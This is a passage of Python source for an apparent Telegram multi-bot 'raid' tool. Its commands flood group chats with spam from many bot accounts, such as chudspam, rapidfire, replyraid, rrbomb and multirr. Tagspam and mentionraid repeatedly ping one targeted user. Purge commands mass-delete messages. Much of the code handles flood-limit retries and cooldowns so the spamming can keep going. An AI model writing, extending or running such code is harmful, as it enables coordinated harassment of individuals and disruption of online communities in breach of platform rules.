    tasks = [asyncio.create_task(_send(bots[i % len(bots)], i)) for i in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await _reply(msg, f"💥 𝐁𝐔𝐑𝐒𝐓 𝐒𝐄𝐍𝐓 — {count} 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬")

@_guard
async def cmd_chudspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -chudspam <text>")
        return
    words = list(_CHUD_WORDS)
    idx   = [0]

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in _bots():
                if stop_ev.is_set():
                    break
                word = words[idx[0] % len(words)]
                idx[0] += 1
                msg_txt = (
                    f"[chud {txt}"
                    f"𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫💥💥"
                    f"{word} "
                    f"𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫 ➴ྀ࿐ ·· ]"
                )
                try:
                    await bot.send_message(cid, msg_txt)
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "chudspam", _run)
    await _reply(msg,
        f"💥 𝐂𝐇𝐔𝐃 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"📛 {txt}\n"
        f"-stopchudspam to stop"
    )

@_guard
async def cmd_stopchudspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "chudspam")
    await _reply(msg, "⛔ 𝐂𝐇𝐔𝐃 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_rapidfire(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -rapidfire <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return

    RAPID = [
        f"⚡🔥{txt}🔥⚡ ➴ྀ",
        f"💥⚡{txt}⚡💥 ·· ➴ྀ",
        f"🌊⚡{txt}⚡🌊 ➴ྀ ··",
        f"👑⚡{txt}⚡👑 ·· ➴ྀ",
    ]
    idx = [0]

    async def _run(stop_ev):
        while not stop_ev.is_set():
            tasks = []
            for bot in bots:
                if stop_ev.is_set():
                    break
                v = RAPID[idx[0] % len(RAPID)]
                idx[0] += 1
                async def _s(b=bot, m=v):
                    try:
                        await b.send_message(cid, m)
                    except Exception:
                        pass
                tasks.append(asyncio.create_task(_s()))
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

    await tc.start(cid, "rapid", _run)
    await _reply(msg,
        f"⚡🔥 𝐑𝐀𝐏𝐈𝐃𝐅𝐈𝐑𝐄 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"📛 {txt}\n"
        f"-stoprapid to stop"
    )

@_guard
async def cmd_stoprapid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "rapid")
    await _reply(msg, "⛔ 𝐑𝐀𝐏𝐈𝐃𝐅𝐈𝐑𝐄 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")


# ═══════════════════════════════════════════
#  AUTO REPLY EXTENDED COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_replyflood(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -replyflood <text>\n𝘉𝘰𝘵 𝘳𝘦𝘱𝘭𝘪𝘦𝘴 𝘵𝘰 𝘌𝘝𝘌𝘙𝘠 𝘮𝘴𝘨 𝘸𝘪𝘵𝘩 𝘴𝘱𝘢𝘮")
        return
    replyflood_chats[cid] = txt
    await _reply(msg,
        f"✅ 𝐑𝐄𝐏𝐋𝐘𝐅𝐋𝐎𝐎𝐃 𝐀𝐂𝐓𝐈𝐕𝐄\n"
        f"💬 {txt}\n"
        f"-stopreplyflood to stop"
    )

@_guard
async def cmd_stopreplyflood(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    replyflood_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐑𝐄𝐏𝐋𝐘𝐅𝐋𝐎𝐎𝐃 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_tagspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg,
            "𝐔𝐬𝐞: -tagspam <uid> <text>\n"
            "𝘒𝘦𝘦𝘱𝘴 𝘮𝘦𝘯𝘵𝘪𝘰𝘯𝘪𝘯𝘨 𝘵𝘢𝘳𝘨𝘦𝘵 𝘶𝘴𝘦𝘳"
        )
        return
    try:
        uid = int(args[0])
    except ValueError:
        await _reply(msg, "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃")
        return
    txt  = " ".join(args[1:]).strip()
    bots = _bots()

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in bots:
                if stop_ev.is_set():
                    break
                try:
                    await bot.send_message(
                        cid,
                        f'<a href="tg://user?id={uid}">⚡</a> {txt}',
                        parse_mode="HTML"
                    )
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "tagspam", _run)
    await _reply(msg,
        f"🎯 𝐓𝐀𝐆𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"👤 𝘜𝘴𝘦𝘳: {uid}\n"
        f"💬 {txt}\n"
        f"-stoptagspam to stop"
    )

@_guard
async def cmd_stoptagspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "tagspam")
    await _reply(msg, "⛔ 𝐓𝐀𝐆𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_copyspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    txt = _txt_arg(ctx)
    target_txt = txt or (rep.text if rep and rep.text else None)
    if not target_txt:
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘴𝘨 𝘰𝘳 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘵𝘦𝘹𝘵")
        return
    bots = _bots()

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in bots:
                if stop_ev.is_set():
                    break
                try:
                    await bot.send_message(cid, target_txt)
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "copyspam", _run)
    await _reply(msg,
        f"📋 𝐂𝐎𝐏𝐘𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"💬 {target_txt[:40]}...\n"
        f"-stopcopyspam to stop"
    )

@_guard
async def cmd_stopcopyspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "copyspam")
    await _reply(msg, "⛔ 𝐂𝐎𝐏𝐘𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")


# ═══════════════════════════════════════════
#  REPLY RAID COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_replyraid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  ⚔️ 𝐑𝐄𝐏𝐋𝐘 𝐑𝐀𝐈𝐃\n"
            "  𝘙𝘦𝘱𝘭𝘺 𝘵𝘰 𝘢 𝘮𝘴𝘨 𝘢𝘯𝘥:\n"
            "  -replyraid <text>\n"
            "  𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘳𝘦𝘱𝘭𝘺-𝘴𝘱𝘢𝘮 𝘵𝘩𝘢𝘵 𝘮𝘴𝘨\n"
            "╚══════════════════════════════╝"
        )
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return
    target_mid = rep.message_id if rep else msg.message_id
    RAID_VARS = [
        f"⚔️ {txt}",
        f"🔥 {txt}",
        f"💀 {txt}",
        f"⚡ {txt}",
        f"💥 {txt}",
        f"👑 {txt}",
        f"🔱 {txt}",
    ]
    idx = [0]

    async def _run(stop_ev):
        gap = _nc_send_gap if _nc_send_gap is not None else 0.09
        fu: Dict[int, float] = {}

        async def _worker(bi):
            bot = bots[bi]
            await asyncio.sleep(bi * 0.10)
            while not stop_ev.is_set():
                if fu.get(bi, 0.0) > time.monotonic():
                    await asyncio.sleep(0.05)
                    continue
                v = RAID_VARS[idx[0] % len(RAID_VARS)]
                idx[0] += 1
                try:
                    await bot.send_message(cid, v, reply_parameters=ReplyParameters(message_id=target_mid, allow_sending_without_reply=False))
                    await asyncio.sleep(gap)
                except RetryAfter as e:
                    wait = float(e.retry_after) + 0.3
                    fu[bi] = time.monotonic() + wait
                    await asyncio.sleep(min(wait, 2.0))
                except (TimedOut, NetworkError):
                    await asyncio.sleep(1.0)
                except BadRequest as e:
                    print(f"[RR_DBG] bot={bi} target={target_mid if 'target_mid' in dir() else target if 'target' in dir() else '?'} BadRequest: {e}", flush=True)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"[RR_DBG] bot={bi} err={type(e).__name__}: {e}", flush=True)
                    await asyncio.sleep(0.5)

        workers = [asyncio.create_task(_worker(i)) for i in range(len(bots))]
        try:
            await asyncio.gather(*workers)
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)

    await tc.start(cid, "replyraid", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚔️ 𝐑𝐄𝐏𝐋𝐘 𝐑𝐀𝐈𝐃 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  💬 {txt}\n"
        f"  🤖 {len(bots)} 𝘣𝘰𝘵𝘴 𝘳𝘢𝘪𝘥𝘪𝘯𝘨\n"
        f"  -stopreplyraid to stop\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_stopreplyraid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "replyraid")
    await _reply(msg, "⛔ 𝐑𝐄𝐏𝐋𝐘 𝐑𝐀𝐈𝐃 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_massreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    txt = _txt_arg(ctx)
    if not (txt and rep):
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘴𝘨 + -massreply <text>\n𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘳𝘦𝘱𝘭𝘺 𝘰𝘯𝘤𝘦 𝘦𝘢𝘤𝘩")
        return
    bots = _bots()

    async def _mass(bot):
        try:
            await bot.send_message(cid, txt, reply_parameters=ReplyParameters(message_id=rep.message_id, allow_sending_without_reply=False))
        except Exception:
            pass

    tasks = [asyncio.create_task(_mass(b)) for b in bots]
    await asyncio.gather(*tasks, return_exceptions=True)
    await _reply(msg, f"✅ 𝐌𝐀𝐒𝐒 𝐑𝐄𝐏𝐋?? 𝐒𝐄𝐍𝐓 ({len(bots)} 𝘣𝘰𝘵𝘴)")

@_guard
async def cmd_mentionraid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg,
            "𝐔𝐬𝐞: -mentionraid <uid> <text>\n"
            "𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘮𝘦𝘯𝘵𝘪𝘰𝘯-𝘴𝘱𝘢𝘮 𝘵𝘢𝘳𝘨𝘦𝘵"
        )
        return
    try:
        uid = int(args[0])
    except ValueError:
        await _reply(msg, "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃")
        return
    txt  = " ".join(args[1:]).strip()
    bots = _bots()

    async def _run(stop_ev):
        while not stop_ev.is_set():
            tasks = []
            for bot in bots:
                if stop_ev.is_set():
                    break
                async def _s(b=bot):
                    try:
                        await b.send_message(
                            cid,
                            f'<a href="tg://user?id={uid}">⚡</a> {txt}',
                            parse_mode="HTML"
                        )
                    except Exception:
                        pass
                tasks.append(asyncio.create_task(_s()))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

    await tc.start(cid, "mentionraid", _run)
    await _reply(msg,
        f"⚔️ 𝐌𝐄𝐍𝐓𝐈𝐎𝐍 𝐑𝐀𝐈𝐃 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"👤 𝘛𝘢𝘳𝘨𝘦𝘵: {uid}\n"
        f"💬 {txt}\n"
        f"-stopmentionraid to stop"
    )

@_guard
async def cmd_stopmentionraid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "mentionraid")
    await _reply(msg, "⛔ 𝐌𝐄𝐍𝐓𝐈𝐎𝐍 𝐑𝐀𝐈𝐃 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

# ═══════════════════════════════════════════
#  PURGE COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_purge(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    try:
        count = int(args[0]) if args else 50
    except ValueError:
        count = 50
    count = min(count, 5000)   # safety cap — prevents ban from mass delete
    rep   = msg.reply_to_message
    from_id = rep.message_id if rep else (msg.message_id - count)
    deleted = 0
    bots    = _bots()
    bot     = bots[0] if bots else None
    if not bot:
        await _reply(msg, "⚠️ No bots available")
        return
    ids_to_del = list(range(max(1, from_id), msg.message_id + 1))
    for chunk in [ids_to_del[i:i+100] for i in range(0, len(ids_to_del), 100)]:
        for bot in bots:
            try:
                await bot.delete_messages(cid, chunk)
                deleted += len(chunk)
                break
            except Exception:
                try:
                    for mid in chunk:
                        try:
                            await bot.delete_message(cid, mid)
                            deleted += 1
                        except Exception:
                            pass
                    break
                except Exception:
                    pass
        await asyncio.sleep(0.1)
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🗑️ 𝐏𝐔𝐑𝐆𝐄𝐃\n"
        f"  𝘋𝘦𝘭𝘦𝘵𝘦𝘥: {deleted} 𝘮𝘴𝘨𝘴\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_purgeme(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    user = update.effective_user
    args = _get_args(ctx)
    try:
        count = int(args[0]) if args else 20
    except ValueError:
        count = 20
    bots    = _bots()
    bot     = bots[0] if bots else None
    if not bot:
        await _reply(msg, "⚠️ No bots available")
        return
    deleted = 0
    # Scan 5× the requested count to reliably find enough user messages
    ids_to_check = list(range(max(1, msg.message_id - max(count * 5, 200)), msg.message_id + 1))
    for mid in reversed(ids_to_check):
        if deleted >= count:
            break
        for b in bots:
            try:
                await b.delete_message(cid, mid)
                deleted += 1
                break
            except Exception:
                pass
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🗑️ 𝐏𝐔𝐑𝐆𝐄𝐌𝐄\n"
        f"  𝘋𝘦𝘭𝘦𝘵𝘦𝘥: {deleted} 𝘮𝘴𝘨𝘴\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_purgebot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    if not bots:
        await _reply(msg, "⚠️ No bots available")
        return
    deleted = 0
    ids_to_check = list(range(max(1, msg.message_id - 300), msg.message_id + 1))
    for mid in reversed(ids_to_check):
        for b in bots:
            try:
                await b.delete_message(cid, mid)
                deleted += 1
                break
            except Exception:
                pass
        await asyncio.sleep(0.01)
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🗑️ 𝐏𝐔𝐑𝐆𝐄𝐁𝐎𝐓\n"
        f"  𝘋𝘦𝘭𝘦𝘵𝘦𝘥: {deleted} 𝘣𝘰𝘵 𝘮𝘴𝘨𝘴\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_purgeall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    if not bots:
        await _reply(msg, "⚠️ No bots available")
        return
    deleted = 0
    ids_to_check = list(range(max(1, msg.message_id - 500), msg.message_id + 1))
    for chunk in [ids_to_check[i:i+100] for i in range(0, len(ids_to_check), 100)]:
        for b in bots:
            try:
                await b.delete_messages(cid, chunk)
                deleted += len(chunk)
                break
            except Exception:
                for mid in chunk:
                    for b2 in bots:
                        try:
                            await b2.delete_message(cid, mid)
                            deleted += 1
                            break
                        except Exception:
                            pass
                break
        await asyncio.sleep(0.05)
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🗑️ 𝐏𝐔𝐑𝐆𝐄𝐀𝐋𝐋\n"
        f"  𝘋𝘦𝘭𝘦𝘵𝘦𝘥: {deleted} 𝘮𝘴𝘨𝘴\n"
        f"╚══════════════════════╝"
    )


# ═══════════════════════════════════════════
#  MORE REPLY RAID (RR) COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_rrbomb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    rep  = msg.reply_to_message
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -rrbomb <text> [count]\n𝘉𝘶𝘳𝘴𝘵 𝑁 𝘳𝘦𝘱𝘭𝘪𝘦𝘴 𝘰𝘯 𝘢 𝘮𝘴𝘨")
        return
    try:
        count = int(args[-1])
        txt   = " ".join(args[:-1]).strip()
        if not txt:
            raise ValueError
    except (ValueError, IndexError):
        txt   = " ".join(args).strip()
        count = 15
    count    = min(count, 50)
    target   = rep.message_id if rep else msg.message_id
    bots     = _bots()
    BOMB_V   = [
        f"💣 {txt}",
        f"🔥 {txt}",
        f"⚔️ {txt}",
        f"💀 {txt}",
        f"👑 {txt}",
    ]

    async def _bomb(i, b=None):
        b = b or bots[i % len(bots)]
        v = BOMB_V[i % len(BOMB_V)]
        for _ in range(3):
            try:
                await b.send_message(cid, v, reply_parameters=ReplyParameters(message_id=target, allow_sending_without_reply=False))
                return
            except RetryAfter as e:
                await asyncio.sleep(min(float(e.retry_after) + 0.3, 3.0))
            except Exception:
                return

    tasks = [asyncio.create_task(_bomb(i)) for i in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await _reply(msg, f"💣 𝐑𝐑𝐁𝐎𝐌𝐁 — {count} 𝘳𝘦𝘱𝘭𝘪𝘦𝘴 𝘴𝘦𝘯𝘵")

@_guard
async def cmd_rrloop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid    = msg.chat_id
    rep    = msg.reply_to_message
    txt    = _txt_arg(ctx)
    if not txt:
        await _reply(msg,
            "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘴𝘨 + -rrloop <text>\n"
            "𝘓𝘰𝘰𝘱 𝘳𝘦𝘱𝘭𝘺𝘪𝘯𝘨 𝘵𝘰 𝘵𝘩𝘢𝘵 𝘮𝘴𝘨 𝘧𝘰𝘳𝘦𝘷𝘦𝘳"
        )
        return
    target = rep.message_id if rep else msg.message_id
    bots   = _bots()
    LOOP_V = [
        f"🔁 {txt}",
        f"♾️ {txt}",
        f"🌀 {txt}",
        f"👑 {txt}",
        f"💎 {txt}",
        f"⚡ {txt}",
        f"🔥 {txt}",
    ]
    idx = [0]

    async def _run(stop_ev):
        gap = _nc_send_gap if _nc_send_gap is not None else 0.09
        fu: Dict[int, float] = {}

        async def _worker(bi):
            bot = bots[bi]
            await asyncio.sleep(bi * 0.10)
            while not stop_ev.is_set():
                if fu.get(bi, 0.0) > time.monotonic():
                    await asyncio.sleep(0.05)
                    continue
                v = LOOP_V[idx[0] % len(LOOP_V)]
                idx[0] += 1
                try:
                    await bot.send_message(cid, v, reply_parameters=ReplyParameters(message_id=target, allow_sending_without_reply=False))
                    await asyncio.sleep(gap)
                except RetryAfter as e:
                    wait = float(e.retry_after) + 0.3
                    fu[bi] = time.monotonic() + wait
                    await asyncio.sleep(min(wait, 2.0))
                except (TimedOut, NetworkError):
                    await asyncio.sleep(1.0)
                except BadRequest as e:
                    print(f"[RR_DBG] bot={bi} target={target_mid if 'target_mid' in dir() else target if 'target' in dir() else '?'} BadRequest: {e}", flush=True)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"[RR_DBG] bot={bi} err={type(e).__name__}: {e}", flush=True)
                    await asyncio.sleep(0.5)

        workers = [asyncio.create_task(_worker(i)) for i in range(len(bots))]
        try:
            await asyncio.gather(*workers)
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)

    await tc.start(cid, "rrloop", _run)
    await _reply(msg,
        f"♾️ 𝐑𝐑𝐋𝐎𝐎𝐏 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"💬 {txt}\n"
        f"🎯 𝘳𝘦𝘱𝘭𝘺𝘪𝘯𝘨 𝘵𝘰 msg#{target}\n"
        f"-stoprrloop to stop"
    )

@_guard
async def cmd_stoprrloop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "rrloop")
    await _reply(msg, "⛔ 𝐑𝐑𝐋𝐎𝐎𝐏 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_multirr(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid    = msg.chat_id
    rep    = msg.reply_to_message
    txt    = _txt_arg(ctx)
    if not txt:
        await _reply(msg,
            "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘴𝘨 + -multirr <text>\n"
            "𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘧𝘪𝘳𝘦 𝘴𝘪𝘮𝘶𝘭𝘵𝘢𝘯𝘦𝘰𝘶𝘴𝘭𝘺"
        )
        return
    target = rep.message_id if rep else msg.message_id
    bots   = _bots()
    MULTI_V = [
        f"⚔️ {txt}",
        f"🔥 {txt}",
        f"💀 {txt}",
        f"🌊 {txt}",
        f"⚡ {txt}",
        f"💥 {txt}",
    ]
    idx = [0]

    async def _run(stop_ev):
        gap = _gap("mgcnc", 0.09)
        fu: Dict[int, float] = {}   # per-bot flood deadline

        async def _worker(bi):
            bot = bots[bi]
            # Staggered startup — prevent burst at t=0
            if bi > 0:
                if await _wait_ev(stop_ev, bi * 0.10):
                    return
            while not stop_ev.is_set():
                # Per-bot flood cooldown
                rem = fu.get(bi, 0.0) - time.monotonic()
                if rem > 0:
                    if await _wait_ev(stop_ev, min(rem, 0.25)):
                        return
                    continue
                v = MULTI_V[idx[0] % len(MULTI_V)]
                idx[0] += 1
                try:
                    await bot.send_message(
                        cid, v,
                        reply_parameters=ReplyParameters(
                            message_id=target,
                            allow_sending_without_reply=False
                        )
                    )
                    if await _wait_ev(stop_ev, gap):
                        return
                except RetryAfter as e:
                    fu[bi] = time.monotonic() + float(e.retry_after) + 0.3
                except (TimedOut, NetworkError):
                    if await _wait_ev(stop_ev, 1.0):
                        return
                except BadRequest:
                    if await _wait_ev(stop_ev, 0.5):
                        return
                except asyncio.CancelledError:
                    return
                except Exception:
                    if await _wait_ev(stop_ev, 0.5):
                        return

        workers = [asyncio.create_task(_worker(i)) for i in range(len(bots))]
        try:
            await stop_ev.wait()          # clean stop — unblocks instantly on stop
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)

    await tc.start(cid, "multirr", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚔️ 𝐌𝐔𝐋𝐓𝐈𝐑𝐑 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  🤖 {len(bots)} 𝘣𝘰𝘵𝘴 𝘴𝘪𝘮𝘶𝘭𝘵𝘢𝘯𝘦𝘰𝘶𝘴𝘭𝘺\n"
        f"  💬 {txt}\n"
        f"  -stopmultirr to stop\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_stopmultirr(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "multirr")
    await _reply(msg, "⛔ 𝐌𝐔𝐋𝐓𝐈𝐑𝐑 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_rrspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid    = msg.chat_id
    rep    = msg.reply_to_message
    txt    = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -rrspam <text>  (reply to target msg)")
        return
    target = rep.message_id if rep else msg.message_id
    bots   = _bots()
    VAR = [
        f"🎯 {txt}",
        f"💥 {txt}",
        f"⚡ {txt}",
        f"🔥 {txt}",
        f"⚔️ {txt}",
    ]
    idx = [0]

    async def _run(stop_ev):
        gap = _nc_send_gap if _nc_send_gap is not None else 0.09
        fu: Dict[int, float] = {}

        async def _worker(bi):
            bot = bots[bi]
            await asyncio.sleep(bi * 0.10)
            while not stop_ev.is_set():
                if fu.get(bi, 0.0) > time.monotonic():
                    await asyncio.sleep(0.05)
                    continue
                v = VAR[idx[0] % len(VAR)]
                idx[0] += 1
                try:
                    await bot.send_message(cid, v, reply_parameters=ReplyParameters(message_id=target, allow_sending_without_reply=False))
                    await asyncio.sleep(gap)
                except RetryAfter as e:
                    wait = float(e.retry_after) + 0.3
                    fu[bi] = time.monotonic() + wait
                    await asyncio.sleep(min(wait, 2.0))
                except (TimedOut, NetworkError):
                    await asyncio.sleep(1.0)
                except BadRequest as e:
                    print(f"[RR_DBG] bot={bi} target={target_mid if 'target_mid' in dir() else target if 'target' in dir() else '?'} BadRequest: {e}", flush=True)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"[RR_DBG] bot={bi} err={type(e).__name__}: {e}", flush=True)
                    await asyncio.sleep(0.5)

        workers = [asyncio.create_task(_worker(i)) for i in range(len(bots))]
        try:
            await asyncio.gather(*workers)
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)

    await tc.start(cid, "rrspam", _run)
    await _reply(msg,
        f"🎯 𝐑𝐑𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"💬 {txt} → msg#{target}\n"
        f"-stoprrspam to stop"
    )

@_guard
async def cmd_stoprrspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "rrspam")
    await _reply(msg, "⛔ 𝐑𝐑𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")


@_guard
async def cmd_bots(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    bots  = _bots()
    lines = [
        "╔══════════════════════╗",
        f"  🤖 𝐁𝐎𝐓𝐒 𝐒𝐓𝐀𝐓𝐔𝐒",
        f"  𝘛𝘰𝘵𝘢𝘭: {len(bots)}",
        "╠══════════════════════╣",
    ]
    for i, bot in enumerate(bots, 1):
        bid   = getattr(bot, "id", id(bot))
        name  = getattr(bot, "username", "unknown")
        flood = "🚫" if _ft.flooded(bid) else "✅"
        lines.append(f"  {flood} Bot {i}: @{name}")
    lines.append("╚══════════════════════╝")
    await _reply(msg, "\n".join(lines))

@_guard
async def cmd_floodstat(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    bots    = _bots()
